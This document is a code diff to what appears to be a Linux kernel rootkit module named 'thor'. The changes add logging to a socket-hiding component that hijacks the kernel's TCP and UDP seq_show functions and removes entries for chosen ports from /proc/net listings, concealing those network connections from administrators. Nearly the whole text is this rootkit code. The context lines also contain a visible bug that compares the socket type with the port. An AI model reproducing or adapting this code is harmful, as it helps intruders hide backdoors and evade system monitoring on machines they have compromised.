@@ -7,6 +7,7 @@
 
 #include "helper.h"
 #include "hijack.h"
+#include "logging.h"
 
 /* socket list node */
 struct _socket_list {
@@ -58,6 +59,8 @@ int sockethider_init(void)
     if (udp6_seq_show == NULL)
         return -1;
 
+    LOG_INFO("hijacking socket seq show functions");
+
     hijack(tcp4_seq_show, thor_tcp4_seq_show);
     hijack(tcp6_seq_show, thor_tcp6_seq_show);
     hijack(udp4_seq_show, thor_udp4_seq_show);
@@ -68,6 +71,8 @@ int sockethider_init(void)
 
 void sockethider_cleanup(void)
 {
+    LOG_INFO("unhijacking socket seq show functions");
+
     if (tcp4_seq_show != NULL)
         unhijack(tcp4_seq_show);
 
@@ -148,6 +153,7 @@ static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
             sprintf(port, ":%04X", tmp->port);
 
             if (strnstr(seq->buf + seq->count - TMPSZ_TCP4, port, TMPSZ_TCP4)) {
+                LOG_INFO("hiding socket tcp4 %d", tmp->port);
                 seq->count -= TMPSZ_TCP4;
                 break;
             }
@@ -178,6 +184,7 @@ static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
             sprintf(port, ":%04X", tmp->port);
 
             if (strnstr(seq->buf + seq->count - TMPSZ_TCP6, port, TMPSZ_TCP6)) {
+                LOG_INFO("hiding socket tcp6 %d", tmp->port);
                 seq->count -= TMPSZ_TCP6;
                 break;
             }
@@ -208,6 +215,7 @@ static int thor_udp4_seq_show(struct seq_file *seq, void *v)
             sprintf(port, ":%04X", tmp->port);
 
             if (strnstr(seq->buf + seq->count - TMPSZ_UDP4, port, TMPSZ_UDP4)) {
+                LOG_INFO("hiding socket udp4 %d", tmp->port);
                 seq->count -= TMPSZ_UDP4;
                 break;
             }
@@ -238,6 +246,7 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
             sprintf(port, ":%04X", tmp->port);
 
             if (strnstr(seq->buf + seq->count - TMPSZ_UDP6, port, TMPSZ_UDP6)) {
+                LOG_INFO("hiding socket udp6 %d", tmp->port);
                 seq->count -= TMPSZ_UDP6;
                 break;
             }
@@ -250,6 +259,8 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
 void add_to_socket_list(int port, enum socket_type type)
 {
     struct _socket_list *tmp;
+
+    LOG_INFO("adding socket %d to hiding list", port);
 
     tmp = (struct _socket_list*) kmalloc(sizeof(struct _socket_list), GFP_KERNEL);
     tmp->port = port;
@@ -266,6 +277,7 @@ void remove_from_socket_list(int port, enum socket_type type)
     list_for_each_safe(pos, q, &(socket_list.list)) {
         tmp = list_entry(pos, struct _socket_list, list);
         if (port == tmp->port && type == tmp->port) {
+            LOG_INFO("removing socket %d from hiding list", port);
             list_del(pos);
             kfree(tmp);
         }
@@ -276,6 +288,8 @@ void clear_socket_list(void)
 {
     struct _socket_list *tmp;
     struct list_head *pos, *q;
+
+    LOG_INFO("clearing socket hiding list");
 
     list_for_each_safe(pos, q, &(socket_list.list)) {
         tmp = list_entry(pos, struct _socket_list, list);
